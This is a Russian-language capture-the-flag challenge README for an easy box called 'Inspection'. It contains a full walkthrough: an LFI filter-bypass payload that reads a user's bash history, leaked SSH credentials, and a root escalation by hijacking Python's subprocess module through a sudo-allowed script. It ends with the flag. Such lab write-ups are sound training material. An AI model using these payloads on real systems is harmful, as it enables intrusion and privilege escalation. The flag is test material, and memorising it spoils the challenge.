# Inspection
<img width="855" alt="image" src="https://github.com/user-attachments/assets/15669a57-5ebe-48b7-8c15-71f90a28a46c">


## Сложность: Easy

## Описание
Мы заказали разработку веб-сайта для нашего инновационного бизнес-проекта, цена была крайне привлекательной и сроки не подвели, однако знающие люди посоветовали вызвать инспекцию по вопросам безопасности...

# Deployment
Сборка образа:
```
docker build -t inspection .
```
Запуск контейнера:
```
docker run -p 5000:80 5001:22 inspection
```

# Writeup 
В ходе изучения ресурса обращаем внимание, что вызов страниц выполняется через параметр page:
```
/index.php?page=main.php
```
Параметр уязвим к Local File Inclusion и имеет слабую фильтрацию, при помощи чего получаем имя пользователя и в его домашней директории находим креды для ssh:
```
/?page=....//....//....//....//home/dexter/.bash_history
dexter:s2cr2t_p255_f0r_ssH
```
Цепляемся по ssh c полученным паролем, проверям sudoers:
```
sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /home/dexter/disk_usage.py
```
Проверяем содержимое файла disk_usage.py:
```
import subprocess

def get_disk_usage():
  output = subprocess.check_output(["df", "-h"])
  return output.decode("utf-8")

if __name__ == "__main__":
  disk_usage = get_disk_usage()
  print(disk_usage)
```
Ничего примечательного, однако файл находится в нашей домашней директории и импортирует стороннюю библиотеку. 
Перемещаемся в директорию скрипта и выполняем Python Module Hijacking:
```
chmod +w /home/dexter
echo 'import os; os.system("/bin/bash")' > subprocess.py
sudo /usr/bin/python3 /home/dexter/disk_usage.py
root@5b270cd538c6:/home/dexter# id
uid=0(root) gid=0(root) groups=0(root)
```
Забираем флаги user.txt и root.txt

## Ответ:
### tqlCTF{lf1_1nsp3ct10n_h4s_4rr1v3d}
